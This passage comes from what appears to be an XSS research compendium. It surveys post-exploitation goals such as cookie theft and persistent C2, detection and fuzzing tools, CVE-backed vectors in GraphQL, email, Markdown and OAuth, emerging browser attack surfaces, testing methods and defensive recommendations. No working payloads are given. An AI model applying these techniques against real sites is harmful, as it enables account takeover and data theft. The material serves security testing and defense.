| Session theft | `document.cookie` / `fetch` | Account takeover |
| Credential harvesting | DOM manipulation | Login form hijacking |
| Internal network scan | WebRTC ICE candidates | Network topology disclosure |
| Persistent C2 channel | WebSocket / Service Worker | Long-lived control |
| Clipboard exfiltration | Clipboard API | Password manager theft |
| File access | File System Access API | Local file read/write |
| Hardware access | Web Bluetooth / Web USB | Device manipulation |

---

## Chapter 23: Advanced Detection and Fuzzing

### Scanner Blind Spots

| Tool | Strength | Blind Spot |
|---|---|---|
| Burp Suite Pro | Wide coverage, authenticated scanning | Multi-step workflows, some DOM XSS |
| OWASP ZAP | Free, extensible | DOM-based XSS, blind XSS |
| Nuclei | Template-driven, fast | Coverage depends on template quality |
| Dalfox | Fast reflected XSS | No stored XSS detection |
| XSStrike | Context-aware reflection | Not optimized for modern JS apps |

### AI/ML-Based Detection

**KameleonFuzz:** Evolutionary fuzzing with attack grammar and fitness-scored mutation.

**GAXSS:** Genetic algorithm to evolve and mutate payload sets.

**FuzzGuard:** Adaptive payload mutation with 41% reduction in redundant HTTP requests vs brute-force.

**LLM-assisted seed generation:** Prompting LLMs to generate focused seed inputs for fuzzing campaigns.

### MutaGen: mXSS Fuzzer

The primary publicly documented tool for systematic mXSS discovery. Generates hard-to-parse HTML fragments and tests them against sanitizers by comparing DOM trees before and after serialize-reparse.

### Polyglot XSS Research

**"Dancer in the Dark" (USENIX Security 2024):** Synthesized optimized polyglot sets for blind XSS. Discovered 20 vulnerabilities in 18 backend systems across Tranco Top 100,000.

Key finding: Truly universal polyglots are infeasible because some injection contexts are mutually exclusive. The goal is minimal polyglot sets for maximum context coverage.

### SAST Limitations for DOM XSS

- **Semgrep OSS:** No DOM-XSS rules in standard packs; requires custom rule authoring
- **CodeQL:** More powerful dataflow analysis but higher false positive rate
- **SonarQube:** Similar limitations to Semgrep OSS

All miss: `eval`-family functions, dynamic property access, framework-specific rendering, event handler registration.

### Browser-Based Detection

Google reports Trusted Types prevented at least 61% of DOM-based XSS that static code analysis missed. Deploying in report-only mode on staging serves as a dynamic DOM XSS audit tool.

---

## Chapter 24: Exotic Vectors

### GraphQL Response XSS

**CVE-2024-24556 (@urql/next):** XSS when response contains HTML tags and app uses streamed responses. Improper escaping in response stream.

**CVE-2026-42794 (GraphiQL):** Reflected XSS via backslash bypass in query GET parameter escaping.

### Email Client XSS

**Gmail AMP DOM clobbering:** Allowed `id` attributes in AMP for Email enabled DOM clobbering.

**CVE-2026-54521 (FairEmail):** AMP email XSS due to JavaScript enabled in WebView without full HTML sanitization.

### Markdown Parser XSS

**Showdown CVE-2026-59710:** Stored XSS through unescaped table header ID attributes.

**Showdown CVE-2026-104477:** Unescaped double quotes in URL attributes (`href`, `src`).

Showdown explicitly states it does not include XSS filtering.

### OAuth/OIDC Flow XSS

**ACSAC 2023 study:** Path confusion and parameter pollution issues in 10 of 16 identity providers.

**Key vectors:** Unsanitized rendering of `redirect_uri`, `state`, `code`, `error` parameters. SPA implementations using `window.location.hash` parsing bypass server-side WAF rules.

### Chrome DevTools Protocol Exploitation

**CDP-Enable-BOF (SpecterOps, August 2026):** Activates debugging server inside an existing chrome.exe process. Requires existing code execution.

**Chrome 136 mitigation:** Ignores debugging switches targeting the default data directory unless non-standard `--user-data-dir` is set.

### Custom URL Scheme / Deep Link XSS

WebView XSS via deep links when apps pass URL parameters directly into rendered content. JavaScript bridge exposure escalates XSS to native code execution.

---

## Chapter 25: Emerging Attack Surfaces

### New Browser Platform Features Creating mXSS Opportunities

**selectedcontent element (Chrome 130+):** Re-clones option content after sanitizer walk. Already exploited: CVE-2026-47423.

**Declarative partial updates (Chrome 150):** Template elements with `for` attribute patch named markers. DOMPurify defense: remove the `for` attribute.

### WebAssembly-Based Evasion

Theoretical advantage: WAF signatures targeting JavaScript syntax won't match compiled WASM bytecode. Practical limitation: WASM requires JavaScript bootstrap code to instantiate and cannot access the DOM directly.

No confirmed WASM-based XSS evasion technique has been demonstrated against a real WAF.

### HTTP/3 and QUIC

HTTP/3's binary framing makes classic CRLF header injection structurally harder. No confirmed HTTP/3-specific XSS attack has been documented. Primary attack surface is QPACK decoder implementation bugs (DoS, not XSS).

### View Transitions API

No direct XSS vulnerability in the browser API. Risk limited to frameworks that fail to escape transition attributes (CVE-2026-59727 in Astro).

### Speculation Rules API

`<script type="speculationrules">` accepts JSON, not executable JavaScript. Theoretical risk: injecting speculation rules to force prerendering attacker-controlled URLs (CSRF-like, not XSS).

### Browser API Post-Exploitation

APIs that extend post-exploitation capabilities after XSS:
- **Web Bluetooth:** Scan/connect to nearby BLE devices
- **Web USB:** Interact with connected USB devices
- **File System Access API:** Read/write arbitrary local files (with user permission)
- **Web Serial:** Interact with serial devices (Chrome 89+, Web Serial over Bluetooth in Chrome 117+)

All require user gestures and permission prompts, but social engineering or kiosk scenarios can bypass these.

---

## Part III: Research Methodology and Tooling Recommendations

### Recommended Testing Approach by Attack Surface

| Attack Surface | Primary Tools | Key Techniques |
|---|---|---|
| DOMPurify/Sanitizer bypass | MutaGen, manual namespace confusion | Parser differential analysis, serialize-reparse comparison |
| Framework SSR XSS | Semgrep custom rules, manual code review | Trace data from loaders/actions through SSR output |
| CSP bypass | CSP Evaluator, RetireJS | JSONP endpoint enumeration, nonce leakage testing |
| CSS exfiltration | Custom stylesheets, sequential injection | Attribute selector + `:has()` chaining |
| postMessage | Chrome DevTools, custom listeners | Origin validation audit, wildcard target detection |
| Prototype pollution to XSS | GHunter, manual gadget hunting | Pollute `__proto__` then test sanitizer/framework sinks |
| DOM clobbering | Hulk, manual named element injection | Target webpack/build tool runtime code |
| Blind XSS | XSS Hunter, ezXSS, XSSpecter | Polyglot payloads (Kirchner et al. methodology) |
| SPA DOM XSS | Trusted Types (report-only), browser DevTools | Source-sink analysis, proxy-first approach |

### Testing Methodology Gaps to Address

1. **DOM-based XSS:** Most scanners miss it. Use Trusted Types report-only mode as a dynamic audit.
2. **Blind/Stored XSS:** Requires out-of-band callback infrastructure. Use polyglot sets for maximum context coverage.
3. **API response XSS:** Trace GraphQL/REST responses through frontend rendering pipeline. Focus on streaming/SSR contexts.
4. **postMessage:** Audit all `message` event handlers for origin validation. Check for wildcard target origins.
5. **Prototype pollution:** Treat any client-side prototype pollution as a potential XSS vector. Test with GHunter gadget patterns.
6. **Framework-specific sinks:** `dangerouslySetInnerHTML` (React), `v-html` (Vue), `[innerHTML]` (Angular), spread attributes (Svelte).
7. **LLM output:** Treat all model responses as untrusted. Test prompt injection to XSS pipeline.

### Impact Demonstration Hierarchy

From lowest to highest severity rating:

1. `alert(1)` pop-up (minimum proof)
2. Cookie theft demonstration
3. Session hijacking with request replay
4. Full account takeover (password change, admin creation)
5. XSS-to-RCE chain (Electron/Tauri/Capacitor, Service Worker persistence)

### Key Defensive Recommendations

1. **Upgrade DOMPurify** to >= 3.4.15
2. **Adopt the Browser Sanitizer API** (setHTML) where available
3. **Deploy Trusted Types** with strict policies (not passthrough defaults)
4. **Implement CSP** with nonce-based `script-src`, include `base-uri 'self'`
5. **Sanitize LLM output** before rendering
6. **Validate postMessage origins** with exact string comparison, not indexOf/regex
7. **Use HttpOnly, Secure, SameSite cookies** to limit post-exploitation impact
8. **Audit framework configurations** for dangerous defaults (Electron nodeIntegration, Tauri IPC permissions)
9. **Monitor for Service Worker registrations** in production
10. **Treat all prototype pollution as high severity** due to gadget availability

---

*Research compiled October 2026. Sources include CVE databases, vendor advisories, academic papers (USENIX Security 2024, Black Hat Europe 2024, ACSAC 2023), DOMPurify Wiki, PortSwigger Research, Microsoft MSRC, OWASP, and 90+ files from three XSS research knowledge bases.*
